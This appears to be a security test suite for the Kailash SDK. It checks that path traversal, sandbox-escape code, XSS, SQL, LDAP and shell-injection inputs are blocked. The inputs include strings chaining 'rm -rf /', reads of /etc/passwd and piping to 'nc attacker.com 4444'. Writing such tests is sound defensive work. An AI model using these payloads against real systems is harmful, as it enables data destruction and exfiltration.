"""
Comprehensive Security Test Suite for Kailash SDK

This module provides exhaustive security testing covering:
- All possible attack vectors
- Edge cases and boundary conditions
- Real-world attack scenarios
- Performance under security constraints
- Security integration with all components

These tests ensure the SDK is secure in all deployment scenarios.
"""

import os
import tempfile
import threading
import time
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from kailash.nodes.api.auth import APIKeyNode, BasicAuthNode, OAuth2Node
from kailash.nodes.api.http import HTTPRequestNode
from kailash.nodes.api.rest import RESTClientNode
from kailash.nodes.code.python import CodeExecutor
from kailash.nodes.data.readers import CSVReaderNode
from kailash.nodes.data.writers import CSVWriterNode
from kailash.runtime.docker import DockerRuntime
from kailash.security import (
    CommandInjectionError,
    ExecutionTimeoutError,
    MemoryLimitError,
    PathTraversalError,
    SecurityConfig,
    SecurityError,
    sanitize_input,
    set_security_config,
    validate_command_string,
    validate_file_path,
)

# from kailash.cli.commands import run_workflow_command  # Import removed for now
# from kailash.utils.export import WorkflowExporter  # Import removed for now


class TestAdvancedPathTraversal:
    """Test advanced path traversal attack vectors."""

    def test_unicode_normalization_attacks(self):
        """Test Unicode normalization path traversal attempts."""
        config = SecurityConfig(allowed_directories=["/tmp"])

        # Unicode encoded path traversal
        unicode_paths = [
            "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
            "..\\u002e\\u002e\\u002fetc\\u002fpasswd",  # Unicode escape
            "..％２Ｆ..％２Ｆ..％２Ｆetc％２Ｆpasswd",  # Full-width characters
            "..\\uFF0E.\\uFF0E.\\uFF0Fetc\\uFF0Fpasswd",  # Unicode dots and slashes
        ]

        for path in unicode_paths:
            with pytest.raises((PathTraversalError, SecurityError)):
                validate_file_path(path, config)

    def test_path_traversal_via_symlinks(self):
        """Test path traversal via symbolic links."""
        with tempfile.TemporaryDirectory() as temp_dir:
            config = SecurityConfig(allowed_directories=[temp_dir])

            # Create symlink pointing outside allowed directory
            symlink_path = Path(temp_dir) / "evil_link"
            try:
                symlink_path.symlink_to("/etc/passwd")

                # Should block access to symlink target
                with pytest.raises((PathTraversalError, SecurityError)):
                    validate_file_path(str(symlink_path), config)
            except OSError:
                pytest.skip("Symlink creation not supported")

    def test_case_sensitivity_bypass(self):
        """Test case sensitivity bypass attempts."""
        config = SecurityConfig(allowed_directories=["/tmp"])

        case_variants = [
            "..\\..\\..\\ETC\\passwd",
            "..\\..\\..\\Etc\\Passwd",
            "..\\..\\..\\etc\\PASSWD",
        ]

        for path in case_variants:
            with pytest.raises((PathTraversalError, SecurityError)):
                validate_file_path(path, config)

    def test_double_encoding_attacks(self):
        """Test double-encoded path traversal."""
        config = SecurityConfig(allowed_directories=["/tmp"])

        double_encoded_paths = [
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
        ]

        for path in double_encoded_paths:
            with pytest.raises((PathTraversalError, SecurityError)):
                validate_file_path(path, config)

    def test_null_byte_injection(self):
        """Test null byte injection attacks."""
        config = SecurityConfig(allowed_directories=["/tmp"])

        null_byte_paths = [
            "safe.txt\x00../../../etc/passwd",
            "safe.txt%00../../../etc/passwd",
            "safe.txt\0../../../etc/passwd",
        ]

        for path in null_byte_paths:
            with pytest.raises((PathTraversalError, SecurityError, ValueError)):
                validate_file_path(path, config)


class TestAdvancedCodeInjection:
    """Test advanced code injection attack vectors."""

    def test_ast_bypass_techniques(self):
        """Test techniques to bypass AST-based security."""
        executor = CodeExecutor()

        bypass_attempts = [
            # Obfuscated imports
            """
x = __import__
os = x('os')
os.system('echo hacked')
""",
            # Dynamic attribute access
            """
import sys
getattr(sys.modules['os'], 'system')('echo hacked')
""",
            # Base64 encoded payloads
            """
import base64
exec(base64.b64decode(b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyBoYWNrZWQnKQ=='))
""",
            # Eval with string construction
            """
cmd = 'import' + ' os; os.system("echo hacked")'
eval(cmd)
""",
        ]

        for code in bypass_attempts:
            with pytest.raises(
                Exception
            ):  # Should be blocked by safety check or execution
                executor.execute_code(code, {})

    def test_namespace_pollution(self):
        """Test namespace pollution attacks."""
        executor = CodeExecutor()

        pollution_code = """
# Try to pollute the namespace
__builtins__['evil'] = lambda: exec('import os; os.system("echo hacked")')
globals()['os'] = __import__('os')
locals()['subprocess'] = __import__('subprocess')
"""

        with pytest.raises(Exception):
            executor.execute_code(pollution_code, {})

    def test_resource_exhaustion(self):
        """Test resource exhaustion attacks."""
        config = SecurityConfig(execution_timeout=1.0, memory_limit=50 * 1024 * 1024)
        executor = CodeExecutor(security_config=config)

        # CPU exhaustion
        cpu_bomb = """
while True:
    pass
"""

        with pytest.raises(ExecutionTimeoutError):
            executor.execute_code(cpu_bomb, {})

        # Memory exhaustion (if memory limits work)
        memory_bomb = """
big_list = []
for i in range(10000000):
    big_list.append([0] * 1000)
"""

        try:
            executor.execute_code(memory_bomb, {})
        except (MemoryLimitError, MemoryError, OSError):
            pass  # Expected to fail

    def test_generator_based_attacks(self):
        """Test generator-based infinite loops."""
        config = SecurityConfig(execution_timeout=1.0)
        executor = CodeExecutor(security_config=config)

        generator_attack = """
def infinite_gen():
    while True:
        yield 1

result = list(infinite_gen())
"""

        with pytest.raises(ExecutionTimeoutError):
            executor.execute_code(generator_attack, {})


class TestAuthenticationSecurity:
    """Test authentication security vulnerabilities."""

    def test_credential_leakage_in_logs(self):
        """Test prevention of credential leakage in logs."""
        with patch("kailash.nodes.api.auth.logger") as mock_logger:
            # Create auth node with credentials
            BasicAuthNode(username="user", password="secret123")

            # Check that logger calls don't contain credentials
            for call in mock_logger.method_calls:
                call_str = str(call)
                assert "secret123" not in call_str
                assert "password" not in call_str.lower()

    def test_oauth_token_security(self):
        """Test OAuth token security."""
        oauth_node = OAuth2Node(
            token_url="https://auth.example.com/token",
            client_id="test_client",
            client_secret="test_secret",
        )

        # Mock token response
        mock_response = MagicMock()
        mock_response.json.return_value = {
            "access_token": "secret_token_123",
            "token_type": "Bearer",
            "expires_in": 3600,
        }

        with patch("requests.post", return_value=mock_response):
            result = oauth_node.run()

            # Verify token is in result but not logged
            assert "access_token" in result

            # Token should not appear in string representation
            node_str = str(oauth_node)
            assert "secret_token_123" not in node_str

    def test_api_key_masking(self):
        """Test API key masking in logs and errors."""
        api_key_node = APIKeyNode(
            api_key="sk-1234567890abcdef", placement="header", key_name="Authorization"
        )

        # Check string representation doesn't expose key
        node_str = str(api_key_node)
        assert "sk-1234567890abcdef" not in node_str

        # Check that errors don't expose the key
        with patch("kailash.nodes.api.auth.logger") as mock_logger:
            try:
                # Force an error
                api_key_node._validate_placement("invalid")
            except Exception:
                pass

            # Verify no log calls contain the API key
            for call in mock_logger.method_calls:
                call_str = str(call)
                assert "sk-1234567890abcdef" not in call_str

    def test_environment_variable_fallback(self):
        """Test secure environment variable fallback."""
        # Test that nodes prefer environment variables
        with patch.dict(os.environ, {"TEST_API_KEY": "env_api_key"}):
            # This would require implementing env var support
            pass  # Placeholder for env var security tests


class TestHttpClientSecurity:
    """Test HTTP client security features."""

    def test_ssl_certificate_validation(self):
        """Test SSL certificate validation."""
        # HTTP client should enforce SSL validation by default
        http_node = HTTPRequestNode(url="https://example.com", method="GET")

        # Should use SSL verification by default
        assert getattr(http_node, "verify_ssl", True) is not False

    def test_header_injection_prevention(self):
        """Test prevention of HTTP header injection."""
        rest_client = RESTClientNode(base_url="https://api.example.com")

        malicious_headers = {
            "X-Custom": "value\r\nX-Injected: malicious",
            "Authorization": "Bearer token\r\nX-Evil: header",
        }

        # Headers with CRLF should be rejected or sanitized
        for header_name, header_value in malicious_headers.items():
            try:
                rest_client.run(
                    endpoint="/test", method="GET", headers={header_name: header_value}
                )
            except Exception:
                pass  # Expected to fail or be sanitized

    def test_url_validation(self):
        """Test URL validation and normalization."""
        malicious_urls = [
            "file:///etc/passwd",
            "ftp://internal.server/secret",
            "gopher://example.com/",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
        ]

        for url in malicious_urls:
            with pytest.raises(Exception):
                HTTPRequestNode(url=url, method="GET").run()


class TestDockerRuntimeSecurity:
    """Test Docker runtime security."""

    def test_container_name_validation(self):
        """Test container name validation."""
        runtime = DockerRuntime(image="python:3.12")

        malicious_names = [
            "container; rm -rf /",
            "container && cat /etc/passwd",
            "container | nc attacker.com 4444",
            "container; docker run --privileged",
            "container`whoami`",
            "container$(id)",
        ]

        for name in malicious_names:
            # Should validate container names
            runtime.container_name = name
            with pytest.raises(Exception):
                runtime.execute({}, {})

    def test_environment_variable_injection(self):
        """Test prevention of environment variable injection."""
        runtime = DockerRuntime(image="python:3.12")

        malicious_env = {
            "NORMAL_VAR": "value; cat /etc/passwd",
            "EVIL_VAR": "value && rm -rf /",
            "INJECT_VAR": "value | nc attacker.com 4444",
        }

        for env_name, env_value in malicious_env.items():
            runtime.env_vars = {env_name: env_value}
            with pytest.raises(Exception):
                runtime.execute({}, {})

    def test_mount_path_validation(self):
        """Test validation of mount paths."""
        runtime = DockerRuntime(image="python:3.12")

        dangerous_mounts = [
            "/etc:/etc",
            "/var:/var",
            "/usr:/usr",
            "/root:/root",
            "/sys:/sys",
            "/proc:/proc",
        ]

        for mount in dangerous_mounts:
            runtime.volume_mounts = [mount]
            with pytest.raises(Exception):
                runtime.execute({}, {})


class TestInputSanitizationComprehensive:
    """Comprehensive input sanitization tests."""

    def test_xss_prevention(self):
        """Test XSS attack prevention."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "';alert('xss');//",
            "\"><script>alert('xss')</script>",
        ]

        for payload in xss_payloads:
            sanitized = sanitize_input(payload)

            # Should remove dangerous content
            assert "<script>" not in sanitized
            assert "javascript:" not in sanitized
            assert "onerror" not in sanitized
            assert "onload" not in sanitized

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention."""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM passwords --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
        ]

        for payload in sql_payloads:
            sanitized = sanitize_input(payload)

            # Should remove dangerous SQL
            assert "DROP TABLE" not in sanitized.upper()
            assert "UNION SELECT" not in sanitized.upper()
            assert "EXEC" not in sanitized.upper()

    def test_command_injection_comprehensive(self):
        """Test comprehensive command injection prevention."""
        injection_payloads = [
            "normal; rm -rf /",
            "normal && cat /etc/passwd",
            "normal | nc attacker.com 4444",
            "normal `whoami`",
            "normal $(id)",
            "normal & background_task",
            "normal || fallback_command",
            "normal > /dev/null",
            "normal < /etc/passwd",
            "normal 2>&1",
        ]

        config = SecurityConfig()

        for payload in injection_payloads:
            with pytest.raises(CommandInjectionError):
                validate_command_string(payload, config)

    def test_format_string_attacks(self):
        """Test format string attack prevention."""
        format_attacks = [
            "{.__class__.__bases__[0].__subclasses__()}",
            "{.__class__.__mro__[1].__subclasses__()}",
            "{.__globals__[os].__dict__[system]}",
            "{.__import__('os').system('echo hacked')}",
        ]

        for attack in format_attacks:
            sanitized = sanitize_input(attack)

            # Should remove format string syntax
            assert "{.__class__" not in sanitized
            assert "__bases__" not in sanitized
            assert "__subclasses__" not in sanitized

    def test_ldap_injection_prevention(self):
        """Test LDAP injection prevention."""
        ldap_payloads = [
            "admin)(|(password=*))",
            "admin)(&(password=*)",
            "*)(cn=*",
            "admin)(!(&(password=*)))",
        ]

        for payload in ldap_payloads:
            sanitized = sanitize_input(payload)

            # Should escape or remove LDAP special characters
            dangerous_chars = ["(", ")", "|", "&", "*", "!"]
            remaining_dangerous = sum(
                1 for char in dangerous_chars if char in sanitized
            )
            assert remaining_dangerous == 0 or remaining_dangerous < len(
                [c for c in payload if c in dangerous_chars]
            )


class TestSecurityConfiguration:
    """Test security configuration management."""

    def test_security_config_immutability(self):
        """Test that security configs can't be easily tampered with."""
        config = SecurityConfig(
            allowed_directories=["/tmp"], max_file_size=1000, execution_timeout=1.0
        )

        # Try to modify config after creation
        config.allowed_directories.copy()
        config.allowed_directories.append("/etc")

        # Should not affect security validation
        with pytest.raises((PathTraversalError, SecurityError)):
            validate_file_path("/etc/passwd", config)

    def test_config_validation(self):
        """Test security configuration validation."""
        # Invalid configurations should be rejected
        with pytest.raises(ValueError):
            SecurityConfig(max_file_size=-1)

        with pytest.raises(ValueError):
            SecurityConfig(execution_timeout=-1.0)

        with pytest.raises(ValueError):
            SecurityConfig(memory_limit=-1)

    def test_secure_defaults(self):
        """Test that security defaults are secure."""
        config = SecurityConfig()

        # Should have secure defaults
        assert config.enable_audit_logging is True
        assert config.enable_path_validation is True
        assert config.enable_command_validation is True
        assert config.max_file_size > 0
        assert config.execution_timeout > 0
        assert config.memory_limit > 0
        assert len(config.allowed_directories) > 0
        assert len(config.allowed_file_extensions) > 0


class TestSecurityIntegration:
    """Test security integration across components."""

    def test_end_to_end_workflow_security(self):
        """Test security in complete workflows."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a workflow with security constraints
            config = SecurityConfig(allowed_directories=[temp_dir])
            set_security_config(config)

            try:
                # Create test data
                input_file = Path(temp_dir) / "input.csv"
                input_file.write_text("name,age\nJohn,30\nJane,25")

                output_file = Path(temp_dir) / "output.csv"

                # Test secure workflow execution
                reader = CSVReaderNode(file_path=str(input_file))
                writer = CSVWriterNode(file_path=str(output_file))

                # Should work within allowed directory
                data = reader.run()
                writer.run(data=data["data"])

                # Should block access outside allowed directory
                with pytest.raises((PathTraversalError, SecurityError)):
                    evil_reader = CSVReaderNode(file_path="/etc/passwd")
                    evil_reader.run()

            finally:
                set_security_config(SecurityConfig())

    def test_concurrent_security_enforcement(self):
        """Test security under concurrent access."""

        config = SecurityConfig(execution_timeout=0.5)
        set_security_config(config)

        try:

            def test_concurrent_execution():
                executor = CodeExecutor()
                try:
                    # This should timeout
                    executor.execute_code("import time; time.sleep(2)", {})
                except ExecutionTimeoutError:
                    pass  # Expected

            # Run multiple threads concurrently
            threads = []
            for _ in range(5):
                thread = threading.Thread(target=test_concurrent_execution)
                threads.append(thread)
                thread.start()

            # Wait for all threads
            for thread in threads:
                thread.join(timeout=2.0)

        finally:
            set_security_config(SecurityConfig())

    def test_security_performance_impact(self):
        """Test that security doesn't severely impact performance."""

        # Test with security enabled
        start_time = time.time()
        config_secure = SecurityConfig()

        for _ in range(100):
            validate_file_path("test.txt", config_secure)

        secure_time = time.time() - start_time

        # Test with security disabled
        start_time = time.time()
        config_disabled = SecurityConfig(
            enable_path_validation=False,
            enable_command_validation=False,
            enable_audit_logging=False,
        )

        for _ in range(100):
            validate_file_path("test.txt", config_disabled)

        insecure_time = time.time() - start_time

        # Security overhead should be reasonable (less than 10x slower)
        assert secure_time < insecure_time * 10


class TestSecurityAuditing:
    """Test security auditing and monitoring."""

    def test_audit_log_completeness(self):
        """Test that all security events are logged."""
        import logging

        # Capture logs
        log_messages = []

        class TestHandler(logging.Handler):
            def emit(self, record):
                log_messages.append(record.getMessage())

        handler = TestHandler()
        logger = logging.getLogger("kailash.security")
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)

        try:
            config = SecurityConfig(enable_audit_logging=True)

            # Trigger various security events
            try:
                validate_file_path("../../../etc/passwd", config)
            except Exception:
                pass

            try:
                validate_command_string("rm -rf /", config)
            except Exception:
                pass

            try:
                sanitize_input("malicious<script>content", config=config)
            except Exception:
                pass

            # Should have logged security events
            security_logs = [
                msg
                for msg in log_messages
                if "security" in msg.lower()
                or "path" in msg.lower()
                or "command" in msg.lower()
            ]
            assert len(security_logs) > 0

        finally:
            logger.removeHandler(handler)

    def test_security_metrics_collection(self):
        """Test collection of security metrics."""
        config = SecurityConfig(enable_audit_logging=True)

        # Track security violations
        violations = []

        def track_violation(violation_type):
            violations.append(violation_type)

        # Simulate security violations
        try:
            validate_file_path("../../../etc/passwd", config)
        except PathTraversalError:
            track_violation("path_traversal")

        try:
            validate_command_string("rm -rf /", config)
        except CommandInjectionError:
            track_violation("command_injection")

        # Should track violations
        assert "path_traversal" in violations
        assert "command_injection" in violations


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
